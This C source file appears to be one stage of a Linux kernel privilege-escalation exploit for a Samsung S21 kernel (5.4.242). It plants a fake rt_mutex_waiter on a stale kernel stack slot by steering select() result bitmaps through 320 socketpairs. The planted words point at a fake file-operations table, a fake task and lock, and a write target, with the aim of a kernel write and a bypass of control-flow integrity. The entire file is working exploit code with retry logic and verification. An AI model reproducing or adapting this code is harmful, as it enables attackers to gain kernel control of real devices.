/*
 * resbit_route.c — S21-specific result-bitmap stack planter.
 *
 * Why this exists: on 5.4.242 every bulk-copy planter misses the stale
 * rt_mutex_waiter slot (pselect input window kisses its boundary 8 bytes
 * short; setsockopt/sendmsg/poll miss structurally; see analysis notes).
 * BUT core_sys_select's RESULT bitmaps (res_in/res_out/res_ex) sit EXACTLY
 * on the slot: res_in base = waiter+0 (binary-verified: bits base SP+0x50,
 * 6 sets x FDS_BYTES(320)=40, res_in = base+3*40; waiter = entry-0x108;
 * chain above core = 0xA0).
 *
 * Result bits are 1-bit-per-ready-fd and FULLY attacker-controlled:
 *   res_in  word w (fds w*64..) <-> waiter + w*8      (R = readable)
 *   res_out word w               <-> waiter + 40+w*8  (W = writable)
 * With 320 socketpairs dup2'd onto fds 0..319, per-direction queue states
 * (data present / buffer full) program arbitrary 64-bit words:
 *   R=1: send 1 byte peer->N.  R=0: leave empty.
 *   W=1: leave non-full.       W=0: blast N->peer to EAGAIN (O_NONBLOCK).
 * Word map (5.4 80B waiter):
 *   res_in  w0 (fds 0-63)    = tree pc     = fake_fops
 *   res_in  w1 (64-127)      = tree right  = 0
 *   res_in  w2 (128-191)     = tree left   = write target (ASHMEM_MISC_FOPS)
 *   res_in  w3/w4            = pi_tree     = 0
 *   res_out w0 (fds 0-63)    = pi upper    = 0
 *   res_out w1 (64-127)      = task        = fake_task
 *   res_out w2 (128-191)     = lock        = fake_lock
 *   res_out w3 (192-255)     = prio/deadline-lo = 120
 *   res_out w4 (256-319)     = deadline-hi = 0
 * ex-set is NULL (res_ex stays zeroed, beyond the waiter).
 *
 * do_select writes result bits DURING polling passes (before blocking);
 * frozen pipe states keep the pattern stable while the consumer's
 * sched_setattr walks it. No return-writeback hazard (copy-out only).
 */
#include "common.h"

#include <errno.h>
#include <poll.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE

#ifndef RESBIT_NFDS
#define RESBIT_NFDS 320
#endif
#ifndef RESBIT_ROUTE_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define RESBIT_ROUTE_ATTEMPTS 4
#else
#define RESBIT_ROUTE_ATTEMPTS 1
#endif
#endif
#ifndef RESBIT_SNDBUF
#define RESBIT_SNDBUF 4096
#endif
/* Peer fds live here (out of the 0..319 monitored range). */
#ifndef RESBIT_PEER_BASE
#define RESBIT_PEER_BASE 400
#endif
/* Safety cap per blast direction (bytes). */
#ifndef RESBIT_BLAST_CAP
#define RESBIT_BLAST_CAP (1 << 20)
#endif

/* Wanted R (res_in) and W (res_out) bit patterns, word w = fds w*64.. */
static void resbit_want(uint64_t *rwant, uint64_t *wwant) {
  uintptr_t target = data_addr(ASHMEM_MISC_FOPS);
  rwant[0] = (uint64_t)fake_fops;
  rwant[1] = 0;
  rwant[2] = (uint64_t)target;
  rwant[3] = 0;
  rwant[4] = 0;
  wwant[0] = 0;
  wwant[1] = (uint64_t)fake_task;
  wwant[2] = (uint64_t)fake_lock;
  wwant[3] = 120; /* prio=120, deadline-lo=0 */
  wwant[4] = 0;
}

/* Save stdio (fds 0..2 are bit positions!). Returns 0 on success. */
static int resbit_save_stdio(int saved[3]) {
  for (int i = 0; i < 3; i++) {
    saved[i] = fcntl(i, F_DUPFD_CLOEXEC, RESBIT_PEER_BASE + RESBIT_NFDS + 16 + i);
    if (saved[i] < 0)
      return -1;
  }
  return 0;
}

static void resbit_restore_stdio(int saved[3]) {
  for (int i = 0; i < 3; i++) {
    if (saved[i] >= 0) {
      dup2(saved[i], i);
      close(saved[i]);
    }
  }
}

/* Build the 320-pair farm. Monitored end dup2'd onto fd==i, peer[i] spare.
 * Returns 0 on success (caller closes everything via resbit_close_farm). */
static int resbit_build_farm(int *peer) {
  int i;
  for (i = 0; i < RESBIT_NFDS; i++) {
    int sv[2];
    peer[i] = -1;
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0)
      goto fail;
    int p = fcntl(sv[1], F_DUPFD_CLOEXEC, RESBIT_PEER_BASE + i);
    close(sv[1]);
    if (p < 0) {
      close(sv[0]);
      goto fail;
    }
    if (dup2(sv[0], i) != i) {
      close(sv[0]);
      close(p);
      goto fail;
    }
    close(sv[0]);
    peer[i] = p;
    int snd = RESBIT_SNDBUF;
    setsockopt(i, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    setsockopt(p, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
    int fl = fcntl(i, F_GETFL, 0);
    if (fl >= 0)
      fcntl(i, F_SETFL, fl | O_NONBLOCK);
  }
  return 0;
fail:
  /* Tear down whatever was pinned (monitored 0..i-1 + peers), stdio stays
   * saved (caller restores). */
  for (int j = 0; j < i; j++) {
    close(j);
    if (peer[j] >= 0)
      close(peer[j]);
  }
  return -1;
}

static void resbit_close_farm(int *peer) {
  for (int i = 0; i < RESBIT_NFDS; i++) {
    close(i);
    close(peer[i]);
  }
}

/* Program R (readable) and W (writable) states to match want patterns. */
static void resbit_program(int *peer, const uint64_t *rwant,
                           const uint64_t *wwant) {
  unsigned char one = 0xA5;
  unsigned char bulk[4096];
  memset(bulk, 0x5A, sizeof(bulk));
  for (int fd = 0; fd < RESBIT_NFDS; fd++) {
    int rbit = (int)((rwant[fd / 64] >> (fd % 64)) & 1ULL);
    int wbit = (int)((wwant[fd / 64] >> (fd % 64)) & 1ULL);
    if (rbit) {
      /* 1 byte peer -> fd : fd becomes readable. */
      (void)write(peer[fd], &one, 1);
    }
    if (!wbit) {
      /* Fill fd -> peer until EAGAIN : fd becomes non-writable. */
      size_t total = 0;
      for (;;) {
        ssize_t w = write(fd, bulk, sizeof(bulk));
        if (w <= 0)
          break;
        total += (size_t)w;
        if (total >= RESBIT_BLAST_CAP)
          break;
      }
    }
  }
}

/* Self-check without disturbing states: poll(0-timeout) and compare. */
static int resbit_verify(const uint64_t *rwant, const uint64_t *wwant) {
  static struct pollfd pfds[RESBIT_NFDS];
  for (int i = 0; i < RESBIT_NFDS; i++) {
    pfds[i].fd = i;
    pfds[i].events = POLLIN | POLLOUT;
    pfds[i].revents = 0;
  }
  if (poll(pfds, RESBIT_NFDS, 0) < 0)
    return -1;
  for (int fd = 0; fd < RESBIT_NFDS; fd++) {
    int rbit = (int)((rwant[fd / 64] >> (fd % 64)) & 1ULL);
    int wbit = (int)((wwant[fd / 64] >> (fd % 64)) & 1ULL);
    int got_r = (pfds[fd].revents & (POLLIN | POLLHUP | POLLERR)) != 0;
    /* Note: POLLOUT on stream sockets is level-triggered; empty send
     * queue reads back as writable. Fresh or drained ends report 1. */
    int got_w = (pfds[fd].revents & POLLOUT) != 0;
    if (!!got_r != rbit || !!got_w != wbit) {
      pr_warning("resbit verify miss fd=%d want R%dW%d got R%dW%d rev=%#x\n",
                 fd, rbit, wbit, !!got_r, !!got_w, pfds[fd].revents);
      return 0;
    }
  }
  return 1;
}

void do_resbit_stamp_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("resbit route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  uint64_t rwant[RESBIT_NFDS / 64];
  uint64_t wwant[RESBIT_NFDS / 64];
  resbit_want(rwant, wwant);

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= RESBIT_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("resbit retry page prepare failed attempt=%d\n",
                 route_attempt);
        break;
      }
      resbit_want(rwant, wwant);
    }

    int saved[3] = {-1, -1, -1};
    int peer[RESBIT_NFDS];
    for (int i = 0; i < RESBIT_NFDS; i++)
      peer[i] = -1;
    if (resbit_save_stdio(saved) != 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_warning("resbit stdio save errno=%d\n", errno);
      break;
    }
    if (resbit_build_farm(peer) != 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      resbit_restore_stdio(saved);
      pr_warning("resbit farm build errno=%d\n", errno);
      break;
    }

    resbit_program(peer, rwant, wwant);
    int vok = resbit_verify(rwant, wwant);

    fd_set in, out;
    FD_ZERO(&in);
    FD_ZERO(&out);
    for (int fd = 0; fd < RESBIT_NFDS; fd++) {
      FD_SET(fd, &in);
      FD_SET(fd, &out);
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    errno = 0;
    /* ex-set NULL: res_ex stays zeroed (beyond the waiter). The monitored
     * in/out patterns ARE the payload (result bitmaps land on the slot). */
    int ret = pselect(RESBIT_NFDS, &in, &out, NULL, &timeout, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);

    resbit_close_farm(peer);
    resbit_restore_stdio(saved);

    /* Logging only AFTER stdio is restored (fd 1 was a socket above). */
    pr_info("resbit programmed attempt=%d verify=%d pc=%016llx lock=%016llx\n",
            route_attempt, vok, (unsigned long long)rwant[0],
            (unsigned long long)wwant[2]);
    if (!vok) {
      cfi_last_step = 36;
      cfi_last_errno = 0;
      continue;
    }
    pr_info("resbit pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            route_attempt, ret, saved_errno, calls, success);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("resbit cfi miss attempt=%d/%d step=%d; refreshing FOPS page\n",
            route_attempt, RESBIT_ROUTE_ATTEMPTS, cfi_last_step);
  }
}

#endif /* !APP_PHYS_P0_ORACLE */
